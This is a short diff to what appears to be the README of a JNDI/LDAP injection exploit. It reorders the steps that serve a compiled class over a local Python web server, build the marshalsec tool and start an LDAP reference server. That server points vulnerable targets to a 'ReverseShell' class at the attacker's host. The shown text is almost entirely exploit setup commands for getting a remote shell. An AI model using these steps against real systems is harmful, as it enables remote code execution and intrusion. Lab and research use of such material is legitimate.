@@ -63,13 +63,15 @@ python3 -m http.server 9090
 python3 -m http.server 9090 --directory somedirectory
 ```
 
-P.S. You can use any web server you like.
-
-Start a local LDAP server and create a reference to the compiled class file on your local web server:
+Download and build LDAP server:
 
 ```bash
 git clone https://github.com/mbechler/marshalsec && cd marshalsec && mvn clean package -DskipTests && cd target
+```
 
+Start LDAP server and create a reference to the compiled class file on your local web server:
+
+```fundamental
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:9090/#ReverseShell
 ```
 
